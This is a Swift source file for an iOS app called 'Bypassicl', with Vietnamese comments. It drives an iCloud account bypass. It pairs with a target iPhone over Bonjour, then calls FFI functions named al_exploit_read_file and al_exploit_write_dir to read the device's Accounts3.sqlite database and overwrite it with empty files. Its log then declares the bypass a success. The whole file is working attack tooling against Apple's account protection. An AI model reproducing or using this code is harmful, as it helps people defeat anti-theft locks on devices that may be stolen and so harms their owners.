import Foundation
import Combine
import UniformTypeIdentifiers
import Network

class AirliftService: ObservableObject {
    static let shared = AirliftService()
    
    @Published var logs: String = "=== Bypassicl Log ===\n"
    @Published var isPairing = false
    @Published var currentPin: String? = nil
    @Published var pairingFilePath: String? = nil
    @Published var lastDeviceName: String? = nil
    
    private var localNetBrowser: NWBrowser?
    private let accountsDir = "/var/mobile/Library/Accounts"
    private let targetFiles = ["Accounts3.sqlite", "Accounts3.sqlite-shm", "Accounts3.sqlite-wal"]
    
    var backupDir: URL {
        FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
            .appendingPathComponent("AccountsBackup")
    }
    
    private var documentsDir: URL {
        FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
    }
    
    private func log(_ message: String) {
        DispatchQueue.main.async {
            self.logs += message + "\n"
            print(message)
        }
    }
    
    // MARK: - Callbacks
    private static let logCallback: ALLogCallback = { ctx, msg in
        guard let msg = msg, let ctx = ctx else { return }
        let service = Unmanaged<AirliftService>.fromOpaque(ctx).takeUnretainedValue()
        service.log("[Airlift] \(String(cString: msg))")
    }
    
    private static let pinCallback: ALPairPinCb = { pin, ctx in
        guard let pin = pin, let ctx = ctx else { return }
        let service = Unmanaged<AirliftService>.fromOpaque(ctx).takeUnretainedValue()
        let pinStr = String(cString: pin)
        DispatchQueue.main.async {
            service.currentPin = pinStr
            service.log("🔐 PIN: \(pinStr)  →  Vào Settings → Developer → nhập PIN này")
        }
    }
    
    private static let readyCallback: ALPairReadyCb = { ctx, serviceId, port, _, _, _ in
        guard let ctx = ctx else { return }
        let service = Unmanaged<AirliftService>.fromOpaque(ctx).takeUnretainedValue()
        let sid = serviceId != nil ? String(cString: serviceId!) : "?"
        service.log("📡 Bonjour ready: \(sid) : \(port)")
    }
    
    // MARK: - Import Pairing File
    func importPairingFile(from url: URL) {
        do {
            // Bắt đầu access security-scoped resource
            let accessing = url.startAccessingSecurityScopedResource()
            defer { if accessing { url.stopAccessingSecurityScopedResource() } }
            
            let data = try Data(contentsOf: url)
            let dest = documentsDir.appendingPathComponent("pairingRecord.mobiledevicepairing")
            try data.write(to: dest)
            
            DispatchQueue.main.async {
                self.pairingFilePath = dest.path
                self.log("✅ Đã import pairing file (\(data.count) bytes)")
            }
        } catch {
            log("❌ Import pairing thất bại: \(error.localizedDescription)")
        }
    }
    
    // MARK: - Pair on Device (iOS 27) - Bonjour + Unlimited
    func startPairingOnDevice() {
        guard !isPairing else { return }
        
        isPairing = true
        currentPin = nil
        log("[*] Bắt đầu Pair on Device (Bonjour)...")
        log("👉 Mở Settings → Developer Mode trên iPhone target và chờ PIN")
        
        let outPath = documentsDir.appendingPathComponent("pairingRecord.mobiledevicepairing").path
        let ctx = Unmanaged.passUnretained(self).toOpaque()
        
        DispatchQueue.main.async {
            self.triggerLocalNetworkPrompt()
        }
        
        DispatchQueue.global(qos: .userInitiated).async {
            var result = ALPairResult()
            
            // port = 0 → OS tự chọn
            // bind_addr = "0.0.0.0" → listen all interfaces
            // name/model có thể tùy chỉnh
            let code = al_pairing_run_host(
                "0.0.0.0",
                0,
                "Bypassicl",
                "iPhone",
                outPath,
                nil,                    // host_alt_irk_hex (lần đầu = nil)
                AirliftService.readyCallback,
                AirliftService.pinCallback,
                ctx,
                &result
            )
            
            defer { al_pairing_result_free(&result) }
            
            DispatchQueue.main.async {
                self.localNetBrowser?.cancel()
                self.localNetBrowser = nil
                self.isPairing = false
                self.currentPin = nil
                
                if code == 0 {
                    if let path = result.pairing_file_path {
                        self.pairingFilePath = String(cString: path)
                        self.log("✅ Pairing thành công!")
                        self.log("📁 File: \(self.pairingFilePath!)")
                    }
                    if let name = result.device_name {
                        self.lastDeviceName = String(cString: name)
                        self.log("📱 Device: \(self.lastDeviceName!)")
                    }
                } else {
                    let err = result.error != nil ? String(cString: result.error!) : "unknown"
                    self.log("❌ Pairing thất bại: \(err)")
                }
            }
        }
    }
    
    private func triggerLocalNetworkPrompt() {
        localNetBrowser?.cancel()
        localNetBrowser = nil
        
        let browser = NWBrowser(
            for: .bonjour(type: "_remotepairing-pairable-host._tcp", domain: "local."),
            using: .tcp
        )
        browser.stateUpdateHandler = { [weak self] state in
            if case .ready = state {
                self?.log("🌐 Đã kích hoạt Local Network")
            }
        }
        localNetBrowser = browser
        browser.start(queue: .main)
        
        DispatchQueue.main.asyncAfter(deadline: .now() + 2.0) { [weak self, weak browser] in
            if self?.localNetBrowser === browser {
                browser?.cancel()
                self?.localNetBrowser = nil
            }
        }
    }
    
    func stopPairing() {
        // al_pairing_run_host là blocking, hiện không có API stop.
        // Chỉ reset UI state.
        localNetBrowser?.cancel()
        localNetBrowser = nil
        isPairing = false
        currentPin = nil
        log("⏹ Đã hủy trạng thái pairing (host vẫn có thể đang chạy)")
    }
    
    // MARK: - Connect (dùng pairing đã có)
    func connect() -> Bool {
        log("[*] Kiểm tra pairing...")
        
        if pairingFilePath == nil {
            // Tự tìm trong Documents
            let candidates = [
                "pairingRecord.mobiledevicepairing",
                "pairingRecord.plist",
                "pairing.plist"
            ]
            for name in candidates {
                let url = documentsDir.appendingPathComponent(name)
                if FileManager.default.fileExists(atPath: url.path) {
                    pairingFilePath = url.path
                    break
                }
            }
        }
        
        guard let path = pairingFilePath, FileManager.default.fileExists(atPath: path) else {
            log("❌ Chưa có pairing file. Hãy Pair on Device hoặc Import file.")
            return false
        }
        
        log("✅ Dùng pairing: \(path)")
        return true
    }
    
    // MARK: - Grappa (giữ nguyên)
    private func generateGrappaToken() -> Data? {
        let maxLen = 1024
        var buffer = [UInt8](repeating: 0, count: maxLen)
        var outLen: size_t = 0
        var errBuffer = [CChar](repeating: 0, count: 256)
        
        let result = ALGetGrappaToken(1, 0, 1, &buffer, maxLen, &outLen, &errBuffer, 256)
        if result == 0 {
            return Data(bytes: buffer, count: Int(outLen))
        } else {
            log("Grappa Error (\(result)): \(String(cString: errBuffer))")
            return nil
        }
    }
    
    // MARK: - FFI helpers
    private func ffi_read_file(_ iosPath: String) -> Data? {
        guard let pairing = pairingFilePath else { return nil }
        
        var outData: UnsafeMutablePointer<UInt8>? = nil
        var outLen: size_t = 0
        var outError: UnsafeMutablePointer<CChar>? = nil
        let ctx = Unmanaged.passUnretained(self).toOpaque()
        
        let result = al_exploit_read_file(pairing, iosPath, AirliftService.logCallback, ctx, &outData, &outLen, &outError)
        
        defer {
            if let e = outError { al_string_free(e) }
            if let d = outData { al_bytes_free(d, outLen) }
        }
        
        guard result == 0, let ptr = outData, outLen > 0 else {
            let err = outError != nil ? String(cString: outError!) : "unknown"
            log("❌ Đọc \(iosPath) thất bại: \(err)")
            return nil
        }
        return Data(bytes: ptr, count: Int(outLen))
    }
    
    private func ffi_write_dir(sourceDir: String, targetDir: String) -> Bool {
        guard let pairing = pairingFilePath else { return false }
        
        var outError: UnsafeMutablePointer<CChar>? = nil
        let ctx = Unmanaged.passUnretained(self).toOpaque()
        
        let result = al_exploit_write_dir(pairing, sourceDir, targetDir, AirliftService.logCallback, ctx, &outError)
        
        defer { if let e = outError { al_string_free(e) } }
        
        if result != 0 {
            let err = outError != nil ? String(cString: outError!) : "unknown"
            log("❌ Ghi đè thất bại: \(err)")
            return false
        }
        return true
    }
    
    // MARK: - Backup & Bypass
    func backupAccounts() -> Bool {
        log("[*] Backup Accounts...")
        try? FileManager.default.createDirectory(at: backupDir, withIntermediateDirectories: true)
        
        var ok = true
        for file in targetFiles {
            let path = "\(accountsDir)/\(file)"
            guard let data = ffi_read_file(path) else {
                ok = false
                continue
            }
            do {
                try data.write(to: backupDir.appendingPathComponent(file))
                log("✅ Backup \(file) (\(data.count) bytes)")
            } catch {
                log("❌ \(error.localizedDescription)")
                ok = false
            }
        }
        return ok
    }
    
    func bypassICloud() {
        log("[*] Bypass (ghi đè rỗng)...")
        guard backupAccounts() else {
            log("❌ Hủy vì backup thất bại")
            return
        }
        
        let tmp = FileManager.default.temporaryDirectory.appendingPathComponent("empty_\(UUID().uuidString)")
        try? FileManager.default.createDirectory(at: tmp, withIntermediateDirectories: true)
        
        for file in targetFiles {
            try? Data().write(to: tmp.appendingPathComponent(file))
        }
        
        if ffi_write_dir(sourceDir: tmp.path, targetDir: accountsDir) {
            log("🎉 BYPASS THÀNH CÔNG! Reboot thiết bị.")
        } else {
            log("❌ Ghi đè thất bại")
        }
        try? FileManager.default.removeItem(at: tmp)
    }
}
